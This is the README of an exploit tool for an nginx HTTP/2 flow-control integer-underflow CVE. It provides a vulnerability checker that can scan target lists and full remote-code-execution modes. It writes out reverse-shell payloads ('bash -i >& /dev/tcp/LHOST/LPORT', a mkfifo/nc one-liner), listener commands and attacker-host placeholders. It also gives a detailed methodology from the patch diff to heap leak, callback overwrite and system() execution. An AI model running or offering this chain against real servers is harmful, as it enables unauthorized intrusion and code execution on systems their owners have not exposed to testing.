# PoC-NGINX2ROOT

An exploit client for **CVE-2026-123007** (an HTTP/2 flow-control integer
underflow in nginx that can lead to RCE with the worker's privileges). A single
Rust binary. **No nginx installation, build, or deployment is required**: the
tool only talks to a target that already exists (a public nginx server, or a
localhost instance you set up yourself).

> **Only want to prove the CVE?** Read `PROOF.md`. One command, ~14 MiB, no
> listener/profile/119 GiB: `poc --host https://TARGET/ --safe` (`--proof` is an
> alias). `--exploit` / `--shell` below are for the full RCE chain.

## Quick start

```bash
# 1. build (once)
cargo build --release

# 2. check whether a target is vulnerable — safe, no crash, ~14 MiB
./target/release/poc --host https://target.example --safe

# 3. many targets at once (one URL per line)
./target/release/poc --targets targets.txt --safe

# or several URLs directly
./target/release/poc --hosts https://a.example --hosts https://b.example
```

With no mode flag, the default is `--safe` (cheap and safe).

Successful output:

```
[+] CVE-2026-123007 PROOF: VULNERABLE
    target: https://target.example/   resource: /index.html
    observed: server=Some("nginx/1.31.8") settings=[...] body=896 bytes
    [1] queued-DATA refund      : PASS (2 streams reset with FLOW_CONTROL_ERROR=3)
    [2] public-byte release    : PASS (10 bytes returned)
    [3] underflowed WU guard   : PASS (post-refund PING ACK)
    [4] connection still usable: PASS
    no memory corruption, no crash, no shell
```

`VULNERABLE` means the accounting bug was proven on that target. `NOT PROVEN`
means the target did not show it (patched, not HTTP/2, body too small, or a
different resource is needed). Exit codes: `0` vulnerable, `4` not proven.

The path can be given in `--host` or explicitly with `--path`:

```bash
./target/release/poc --host https://target.example/landing --safe   # resource /landing
./target/release/poc --host https://target.example --safe --path /large-file.bin
```

`--safe` requires HTTPS + HTTP/2 (ALPN `h2`) and a resource of **521–8192
bytes** that supports `Range`. The error message reports the computed wave size
when the body is outside that range.

## Traffic

| Mode | What it proves | Traffic | Time |
|------|----------------|---------|------|
| `--safe` | accounting bug + underflowed guard, no corruption | **~14 MiB** | seconds |
| `--exploit` | full chain, payload dispatched | **~119 GiB** | minutes |
| `--shell` | full chain + `id`/`whoami`/`date`/`uname -a` | **~119 GiB** | minutes |

To answer "is the target vulnerable?", `--safe` is enough. Hundreds of GB are
only used when actually running RCE.

## `--targets` (target list)

One origin per line; empty lines and `# comments` are ignored:

```
# example targets.txt
https://target-a.example
https://target-b.example:8443
```

`http://...` lines are `SKIP`ped because `--safe` requires TLS + ALPN `h2`
(HTTP/1.1-only targets are also `SKIP`/`NOT PROVEN`). `--targets` is only for
`--safe`; for exploitation, run one target at a time with `--host`.

One result line is printed per target, followed by a summary
`N tested, M vulnerable`.

## `--exploit` and `--shell`

These require a target that **matches an embedded profile** (nginx 1.31.8
Debian 13 amd64, glibc 2.41, target CPU with `avx512f` + `avx512vl`, 4 workers,
896-byte `/index.html`). A 1.31.6 profile is also included. Without a match,
`--safe` can still answer the vulnerability question, but the RCE chain will
not run.

Choose **one** workflow, not both (otherwise the port conflicts):

**Workflow A — `--shell` (simplest; the tool listens):**
```bash
./target/release/poc --host https://target --shell --lhost ATTACKER_IP --yes
# do not run nc/socat: the tool already listens on 0.0.0.0:4444
```

**Workflow B — `--exploit` + a manual listener:**
```bash
# macOS / BSD:
nc -lv 4444
# Linux (nc/OpenBSD):
nc -lvnp 4444
# cross-platform alternative: socat TCP-LISTEN:4444,fork -

# dispatch the payload (prints the listener command and payload before the bulk)
./target/release/poc --host https://target.example --exploit \
  --lhost 203.0.113.10 --lport 4444 --yes
```

`--exploit` does **not** listen itself; exit `0` only means the payload was
dispatched (`DISPATCHED (unconfirmed)`). Your listener is the evidence.

Alternatively, let the tool listen and verify the shell:

```bash
./target/release/poc --host https://target.example --shell \
  --lhost 203.0.113.10 --lport 4444 --yes
# optional: --interactive to relay stdin/stdout after verification
```

`--shell` sends `id; whoami; date; uname -a; echo __OK__` and only reports
`SHELL OK` when the output contains `uid=`. Exit codes: `0` shell verified,
`1` stage error, `2` vulnerable but the chain did not finish, `3` dispatched
with no shell, `4` not proven.

Default payload: `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` (120-byte limit).
Without bash, use `--cmd`, e.g.
`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f`.

## Build

Linux: `libssl-dev` + `pkg-config` are required. macOS (Homebrew):

```bash
brew install openssl@3 pkg-config
export PKG_CONFIG_PATH="$(brew --prefix openssl@3)/lib/pkgconfig"
cargo build --release
```

Without `PKG_CONFIG_PATH`, the `openssl` crate picks up LibreSSL and fails.
The binary is `target/release/poc`.

## Troubleshooting

- **`target does not negotiate HTTP/2 (ALPN h2) over TLS`** — HTTP/2 is off on
  that listener (or the target is HTTP/1.1-only).
- **`safe mode needs a response body of 521..8192 bytes`** — point `--path` at
  a larger static file.
- **`cleanup-overcredit oracle failed`** — the target is patched, or a
  proxy/CDN is not passing the HTTP/2 frames through unchanged.
- **`in-band HTTP/2 fingerprint matches no validated profile`** — a different
  build/version; `--safe` remains valid, `--exploit` needs a calibrated profile.
- **`DISPATCHED, NO SHELL`** — the payload ran but could not reach `--lhost`
  (firewall/NAT), or bash is missing. Use `--cmd` with an observable oracle.
- **`POC_KEYUPDATES`** — a debug knob that shortens the bootstrap flight; it
  is not part of a real run.

## Developing / validating the tool itself

This section is not needed to test a target. `scripts/validate-safe.sh` builds
nginx 1.31.8 and 1.31.10 from a local source tree and asserts `VULNERABLE` /
`NOT PROVEN` — it tests the tool, it does not prepare an exploit target. Results
on the development host:

- nginx 1.31.8 → `VULNERABLE` (exit 0)
- nginx 1.31.10 (patched) → `NOT PROVEN` (exit 4)

The full chain needs an x86-64 + AVX512 target; the limits are described in the
technical section below. Design notes and implementation plans are kept in the
local working tree and are not pushed.

## Research log: writing the exploit from a CVE and public sources

This section is a methodology note: how to go from "a critical CVE was
announced this morning" to a working checker and exploit, using only public
material and the vulnerable software itself. No private bug details and no
ready-made exploit code are assumed.

### 1. Triage the advisory: what is the primitive?

Start with the authoritative records, not with blog posts:

- [CVE-2026-123007](https://www.cve.org/CVERecord?id=CVE-2026-123007) — CWE-191
  (integer underflow), CVSS 4.0 9.2, unauthenticated network attacker.
- [F5 advisory K000163926](https://my.f5.com/manage/s/article/K000163926) —
  affected versions (nginx OSS 1.9.5–1.30.6 and 1.31.0–1.31.8), fixed
  1.30.7 / 1.31.9, and the configuration condition (HTTP/2 enabled).

The advisory wording already contains the primitive: *the client can cancel
queued response data, nginx returns flow-control credit, and the connection
send window can end up above the protocol maximum*. Everything else is
engineering around that sentence. Note two important constraints from the
start: HTTP/2 must be enabled, and the final impact depends on a native memory
copy implementation — so the work will split into a **protocol bug** (easy to
prove) and an **exploitation path** (build-specific).

### 2. Reverse-read the vendor patch

The fastest way to learn exactly which expression is wrong is to diff the last
vulnerable release against the first fixed one. Clone the **official nginx
repository** and compare the two tags:

```bash
git clone https://github.com/nginx/nginx.git
cd nginx
git fetch --depth 1 origin tag release-1.31.8 tag release-1.31.9
git diff release-1.31.8 release-1.31.9 -- src/http/v2/
```

Three changes matter:

```c
/* ngx_http_v2.h */
size_t send_window;
size_t send_queued;        /* NEW: credit reserved but not yet sent */

/* ngx_http_v2.c */
- if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window) {
+ if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window - h2c->send_queued) {

/* ngx_http_v2_create_stream */
+ ngx_reusable_connection(h2c->connection, 0);
```

Read the patch as a specification, in reverse:

- A new `send_queued` counter means the old code **lost track of reserved
  credit** when a stream was cancelled. The refund path
  (`h2c->send_window += window` in `ngx_http_v2_filter_cleanup()`) has no bound
  check.
- Once `send_window > 0x7fffffff`, `NGX_HTTP_V2_MAX_WINDOW - send_window` is
  evaluated on an unsigned `size_t` and wraps to a huge positive number, so
  the guard accepts increments that should be rejected.
- The queue-position helper in the same diff shows that refunds only make
  sense when all frames of a stream are contiguous — that is how we know which
  frames must still be unsent when the stream is reset.
- The `ngx_reusable_connection` change fixes a *different* bug
  (CVE-2026-123633); it is not the underflow, but it explains why a long-lived
  connection can disappear during testing.

From those five lines we can already write the trigger: keep DATA queued,
raise the window, reset the stream, let cleanup over-credit, then push the
window to the top half of the 64-bit range with legal increments.

### 3. Ground the frames in RFC 9113

[RFC 9113](https://www.rfc-editor.org/rfc/rfc9113.html) supplies the rest of
the vocabulary, and it is important to implement it ourselves: a general HTTP/2
client library will refuse to emit the intentionally invalid state.

- §4.1: every frame is a 9-byte header (3-byte length, type, flags, 31-bit
  stream id).
- §6.5 / §6.9: `SETTINGS_INITIAL_WINDOW_SIZE` changes the starting credit of
  new streams; `WINDOW_UPDATE` carries a 31-bit increment; stream 0 means the
  whole connection.
- §6.9 also fixes the maximum window at 2^31-1 and explains why each legal
  increment is at most 0x7fffffff.

That last point explains the cost of the exploit before any code is written:
moving a 64-bit counter by ~2^64 with 2^31-byte steps needs ~2^33 frames. At
13 bytes per frame that is ~104 GiB. This is a **protocol floor**, not a
slow implementation — no client-side optimisation can remove it.

### 4. Build the cheapest possible oracle first

Before attempting memory corruption, ask: *what is the smallest legal traffic
that distinguishes a vulnerable nginx from a patched one?* The answer from
step 2 is a four-frame-state experiment:

1. Measure a real response body with two ordinary GETs.
2. Consume the default 65,535-byte connection window exactly, using that body
   size (full responses plus one `Range` response).
3. Apply physical backpressure, create two new streams with a zero initial
   window, and give them only per-stream credit so their DATA stays queued.
4. Send the accounting event: `WU(0, reserved)`, `WU(0, MAX)`, two
   `WU(stream, MAX-1)`, `SETTINGS(+2)`, `WU(0, MAX)`, `SETTINGS(65535)`, and a
   small `Range` request.

The first connection-level update lets nginx queue the two DATA frames; the
`SETTINGS(+2)` overflows the two stream windows, so nginx terminates those
streams and cleanup refunds their credit **on top of** `MAX`. The second
connection update is the one that should be rejected.

Observable evidence, all from nginx itself:

| Oracle | Vulnerable behaviour |
|---|---|
| `RST_STREAM` on both target streams | error code 3 (`FLOW_CONTROL_ERROR`) |
| public `Range` response | exactly 10 bytes returned |
| PING after the event | ACKed on the same connection |
| connection state | still open |

These four checks became `src/runner.rs::SafeReport` and the four PASS lines
printed by `--safe`. They are deliberately independent of any build-specific
constant, so the checker works on any HTTP/2 nginx with a suitably sized
resource. A patched build rejects the second `WINDOW_UPDATE` and closes the
connection: that is our negative control, validated against nginx 1.31.10.

This is the key research decision: **prove the bug before attempting the
exploit**. It costs ~14 MiB and a few seconds instead of ~119 GiB.

### 5. Turn the invalid counter into a memory access

Public technical write-ups explain the second half of the path:

- [Rapid7's analysis](https://www.rapid7.com/blog/post/ve-cve-2026-123007-critical-nginx-http-2-integer-underflow-leads-to-rce-fixed/)
  documents the signed/unsigned cast chain and the addendum explaining why an
  almost-2^64 length can return instead of faulting.
- [Wiz's write-up](https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities)
  and [Xint's nginx2root article](https://xint.io/blog/nginx2root-remote-code-execution)
  describe the heap read/write and callback-overwrite strategy.

Following that chain in the source:

1. `ngx_http_v2_send_chain()` casts the oversized unsigned window to `off_t`,
   producing a small negative limit.
2. `ngx_http_v2_filter_get_shadow()` sets `last = pos + size` with that
   negative size, so `last < pos`.
3. `ngx_ssl_send_chain()` computes `size = last - pos` (negative) and calls
   `ngx_memcpy` with a `size_t` length of 2^64 - d.
4. On x86-64 glibc, the CPU-selected EVEX/YMM `memcpy` computes its end cursor
   modulo 2^64. The cursor wraps below the destination, so the backward copy
   loop stops after a bounded number of accesses: a controlled out-of-bounds
   read *and* write instead of a crash.

This step is why the exploit is conditional: a different libc or CPU selects a
different copy routine and the bounded-copy behaviour disappears. Those are
target facts, not choices we can make in the client.

### 6. From corruption to code execution

The memory access is constrained — we cannot choose an arbitrary address — so
the exploit follows the shape of the heap rather than forcing one:

- Arrange a response body next to heap metadata so the oversized copy returns
  pointers (heap, nginx image, libc) inside an ordinary HTTP/2 response: an
  ASLR bypass delivered by the target itself.
- Reclaim the freed chunk on the same nginx worker with parallel connections
  carrying attacker-chosen header values; overwrite a live cleanup callback.
- Use the disclosed ELF metadata to resolve `system()` on the wire instead of
  hard-coding an offset.
- Trigger the cleanup and run `system(command)` with the worker's privileges.

`src/leak.rs` and `src/reclaim.rs` implement exactly these steps. Because the
addresses and object layouts are build-specific, they are kept as data in
`src/profiles/*.json` and validated with fail-closed invariants; the code only
contains protocol handling and the exploitation algorithm.

### 7. Verification discipline

Three rules kept the implementation honest:

1. **Negative control.** The checker must report `NOT PROVEN` on patched
   nginx 1.31.10, not merely "different".
2. **No success by assumption.** `--exploit` reports `DISPATCHED
   (unconfirmed)`; only `--shell`, which sees a `uid=` line from a reverse
   connection, may report `SHELL OK`.
3. **Separate the primitive from the weapon.** If a target fails profile
   selection, the vulnerability may still be real. `--safe` remains the answer
   to "is it vulnerable?", and it never corrupts memory.

## Short technical summary

1. **Bootstrap.** Refund credit for queued DATA frames after raising the
   connection window to `MAX`; `SETTINGS(+2)` forces the streams to be reset and
   cleanup returns credit above `MAX`. The `MAX - send_window` check then
   underflows.
2. **Wrap.** 960 carrier frames of 16 MiB (15 GiB, to buy nginx's control-frame
   flood budget) plus ~2^33 legal `WINDOW_UPDATE`s (~104 GiB) down to
   `2^64 - 14392`.
3. **Leak.** A `memcpy` with length `2^64-d` leaks 14,393 bytes of
   heap/libc/nginx memory; the matching profile is selected from invariants,
   not from a version string.
4. **Reclaim.** 16 auxiliary connections reclaim the chunks, C's cleanup is
   redirected to a forged object, `system` is resolved in-band from libc's ELF,
   and `system(command)` runs.

The exact numbers and the reason for each value are in the comments in
`src/bootstrap.rs`, `src/leak.rs`, `src/reclaim.rs`, and the profile JSON files
in `src/profiles/`.

## Credits and legal

CVE-2026-123007 was found by Stephen Fewer (Rapid7); Wiz, Xint, Ikotas Labs,
and Metnir reported related findings. Fixed in nginx 1.30.7 / 1.31.9. This
repository implements the exploitation strategy described in the public
analysis linked above.

Only test systems you own or have written authorization to test. `--safe` is
designed for that; `--exploit` and `--shell` execute code and can crash a
worker.
